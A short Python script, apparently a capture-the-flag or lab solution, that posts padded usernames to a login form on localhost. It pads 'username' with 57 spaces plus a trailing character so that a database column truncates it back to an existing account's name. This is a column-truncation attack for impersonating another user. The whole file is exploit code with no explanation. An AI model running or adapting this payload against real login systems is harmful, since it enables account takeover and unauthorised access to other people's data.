import requests
from requests.auth import HTTPBasicAuth


url="http://localhost/"
auth=HTTPBasicAuth('username','password')

session=requests.Session()
payload='username'+' '*57+'x'
payload1='userrname'+' '*57
print(len(payload))
data={'username': payload, 'password': 'pass'}
data1={'username': payload1, 'password': 'pass'}
response=session.post(url, data=data, auth=auth)
print(response.text)
response=session.post(url, auth=auth, data=data)
print(response.text)
response=session.post(url, auth=auth, data=data1)
print(response.text)
